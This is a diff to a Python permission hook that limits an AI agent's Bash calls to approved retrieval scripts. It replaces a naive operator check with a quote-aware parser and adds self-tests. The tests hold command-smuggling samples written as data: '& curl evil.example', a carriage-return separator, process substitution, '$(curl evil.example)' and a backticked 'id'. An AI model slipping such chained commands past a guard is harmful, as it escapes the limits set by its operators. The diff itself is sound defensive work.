@@ -29,8 +29,14 @@ PLUGIN_PREFIX = "research-bearings:"
 WRITE_ROOT = "research"
 SCRIPT_ROOT = ("scripts", "retrieval")
 INTERPRETERS = ("python3", "python")
-# Anything that would let one allowed command smuggle a second one.
-SHELL_OPERATORS = (";", "&&", "||", "|", "`", "$(", ">", "<", "\n")
+# Characters that separate or redirect commands when the shell sees them
+# outside quotes. `&` counts as much as `;` does: `snowball.py health & curl
+# evil` is two commands, and the tuple this replaced had `&&` but not `&`.
+SHELL_OPERATORS = ";&|<>()\n\r"
+# Command substitution runs even inside double quotes. Only single quotes
+# suppress it, so these are refused wherever they are not single-quoted.
+SUBSTITUTION = "$("
+BACKTICK = "`"
 
 
 def plugin_root():
@@ -73,6 +79,45 @@ def decide_write(payload, env):
     )
 
 
+def has_shell_syntax(command):
+    """True if the command carries shell syntax that could run a second thing.
+
+    Quote-aware in both directions, and both directions were wrong before:
+    `search "flood | damage"` is one argument the shell never splits, and was
+    being refused; `health & curl evil` is two commands, and was being allowed.
+    So operators count only outside quotes, and command substitution counts
+    inside double quotes too, because the shell still runs it there.
+    """
+    i, n, quote = 0, len(command), None
+    while i < n:
+        c = command[i]
+        if quote == "'":
+            # Nothing expands inside single quotes, not even a backslash.
+            if c == "'":
+                quote = None
+            i += 1
+            continue
+        if c == "\\":
+            i += 2
+            continue
+        if command.startswith(SUBSTITUTION, i) or c == BACKTICK:
+            return True
+        if quote == '"':
+            if c == '"':
+                quote = None
+            i += 1
+            continue
+        if c in "'\"":
+            quote = c
+            i += 1
+            continue
+        if c in SHELL_OPERATORS:
+            return True
+        i += 1
+    # An unterminated quote is not a command this guard can reason about.
+    return quote is not None
+
+
 def decide_bash(payload, env):
     command = ((payload.get("tool_input") or {}).get("command") or "").strip()
     if not command:
@@ -83,7 +128,7 @@ def decide_bash(payload, env):
         "`python3 <plugin>/scripts/retrieval/<script>.py ...`, nothing else and "
         "nothing chained. Refused: {}".format(command[:200])
     )
-    if any(op in command for op in SHELL_OPERATORS):
+    if has_shell_syntax(command):
         return why
     try:
         parts = shlex.split(command)
@@ -270,7 +315,30 @@ def selftest():
         check("our agent running python -c is DENIED",
               bash(scout, 'python3 -c "import os; os.system(\'id\')"'), env, True)
 
-        # 22. Another plugin's agent may run whatever it likes.
+        # 22-28. Bash: the quoting boundary, in both directions. Everything in
+        # this block was measured wrong on 2026-09-14: `&` and a carriage
+        # return walked straight through the fence, and a pipe inside a search
+        # term was refused as if it were a pipeline.
+        check("our agent backgrounding a second command with & is DENIED",
+              bash(scout, 'python3 "{}" health & curl evil.example'.format(script)), env, True)
+        check("our agent separating with a carriage return is DENIED",
+              bash(scout, 'python3 "{}" health\rcurl evil.example'.format(script)), env, True)
+        check("our agent redirecting into a subshell is DENIED",
+              bash(scout, 'python3 "{}" health > (curl evil.example)'.format(script)), env, True)
+        check("command substitution inside double quotes is DENIED",
+              bash(scout, 'python3 "{}" search "$(curl evil.example)"'.format(script)), env, True)
+        check("a backtick inside double quotes is DENIED",
+              bash(scout, 'python3 "{}" search "`id`"'.format(script)), env, True)
+        check("a pipe inside a quoted search term is allowed",
+              bash(scout, 'python3 "{}" search "flood | damage" --limit 5'.format(script)), env, False)
+        check("an ampersand inside a quoted search term is allowed",
+              bash(scout, 'python3 "{}" search "R&D damage assessment" --limit 5'.format(script)), env, False)
+
+        # 29. An unterminated quote is not a command we can reason about.
+        check("an unterminated quote is DENIED",
+              bash(scout, 'python3 "{}" search "flood'.format(script)), env, True)
+
+        # 30. Another plugin's agent may run whatever it likes.
         check("another plugin's agent Bash is allowed",
               bash("Explore", "ls -la"), env, False)
 
